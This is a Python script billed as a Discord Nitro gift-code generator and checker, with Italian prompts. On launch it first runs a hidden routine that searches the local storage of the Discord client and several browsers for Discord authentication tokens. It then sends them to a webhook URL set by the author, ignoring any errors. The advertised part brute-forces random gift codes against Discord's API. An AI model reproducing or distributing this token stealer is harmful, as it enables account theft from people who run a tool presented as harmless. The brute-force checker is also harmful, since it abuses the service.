
import os
import re
import json
import random
import string
import time
import ctypes
import discord_webhook

from urllib.request import Request, urlopen

try: # 
    from discord_webhook import DiscordWebhook # 
except ImportError: # 
    input(f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit") # Tell the user it has not been installed and how to install it
    exit() # 
try: # 
    import requests # 
except ImportError: #
    input(f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")# Tell the user it has not been installed and how to install it
    exit() # 

WEBHOOK_URL = 'YOU WEBHOOK'

# ping per ogni token hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Swaps Logger: Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'Nessun token trovato.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()

class NitroGen: #
    def __init__(self): # T
        self.fileName = "Nitro Codes.txt" # 

    def main(self): # 
        os.system('cls' if os.name == 'nt' else 'clear') #
        if os.name == "nt": # 
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker - Made by swaps#9999") # 
        else: # 
            print(f'\33]0;Nitro Generator and Checker - Made by skidders\a', end='', flush=True) # U

        print("""  _________                             
        SKKIDERS SKKIDERS SKKIDERS SKKIDERS
        SKKIDERS SKKIDERS SKKIDERS SKKIDERS
        SKKIDERS SKKIDERS SKKIDERS SKKIDERS By: !Snosny
        SKKIDERS SKKIDERS SKKIDERS SKKIDERS
        SKKIDERS SKKIDERS SKKIDERS SKKIDERS

                                                        """) # 
        time.sleep(2) # 
        self.slowType("Made by: !Snosny#9999", .02) # 
        time.sleep(1) # 
        self.slowType("\nQuanti codici vuoi generare?: ", .02, newLine = False) # 
        num = int(input('')) # 
        # 
        self.slowType("\nVuoi usare webhook? \nPremi INVIO per ignorare: ", .02, newLine = False)
        url = input('') # Get the awnser
        webhook = url if url != "" else None # 

        # print() 

        valid = [] # 
        invalid = 0 # 

        for i in range(num): # 
            try: # 
                code = "".join(random.choices( # 
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))
                url = f"https://discord.gift/{code}" # 

                result = self.quickChecker(url, webhook) # 

                if result: # 
                    valid.append(url) #
                else: # 
                    invalid += 1 # 
            except Exception as e: #
                print(f" Error | {url} ") #

            if os.name == "nt": # If the system is windows
                ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro Generator and Checker - {len(valid)} Validi | {invalid} Invalidi - Made by swaps#9999") # 
                print("")
            else: # If it is a unix system
                print(f'\33]0;Nitro Generator and Checker - {len(valid)} Validi | {invalid} Invalidi - Made by swaps#9999\a', end='', flush=True) # 
        print(f"""
Resultati:
 Validi: {len(valid)}
 Invalidi: {invalid}
 Codici validi: {', '.join(valid )}""") #

        input("\nPremi 5 volte per chiudere il programma.") # 
        [input(i) for i in range(4,0,-1)] # 

    def slowType(self, text, speed, newLine = True): # 
        for i in text: # 
            print(i, end = "", flush = True) # 
            time.sleep(speed) # 
        if newLine: # 
            print() # 

    def generator(self, amount): # 
        with open(self.fileName, "w", encoding="utf-8") as file: # 
            print("Aspetta..") # 

            start = time.time() # 

            for i in range(amount): #
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                )) # Generate the code id

                file.write(f"https://discord.gift/{code}\n") # 

            # 
            print(f"Generati {amount} codes | Tempo Rimasto: {round(time.time() - start, 5)}s\n") #

    def fileChecker(self, notify = None): # 
        valid = [] # 
        invalid = 0 # 
        with open(self.fileName, "r", encoding="utf-8") as file: #
            for line in file.readlines(): # 
                nitro = line.strip("\n") # 
                #
                url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                response = requests.get(url) # 

                if response.status_code == 200: #
                    print(f" Valid | {nitro} ") #
                    valid.append(nitro) # s

                    if notify is not None: # 
                        DiscordWebhook( # 
                            url = notify,
                            content = f"NITRO TROVATO! @everyone \n{nitro}"
                        ).execute()
                    else: #
                        break # 

                else: # 
                    print(f" Invalid | {nitro} ") # 
                    invalid += 1 # 

        return {"valid" : valid, "invalid" : invalid} # 

    def quickChecker(self, nitro, notify = None): # 
        # Generate the request url
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url) # 

        if response.status_code == 200: # 
            print(f" Valid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # 
            with open("Nitro Codes.txt", "w") as file: # 
                file.write(nitro) # 

            if notify is not None: #
                DiscordWebhook( #
                    url = notify,
                    content = f"NITRO TROVATO! @everyone \n{nitro}"
                ).execute()

            return True # Tell the main function the code was found

        else: # 
            print(f" Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") #
            return False # 

if __name__ == '__main__':
    Gen = NitroGen() #
    Gen.main() # Run the main code

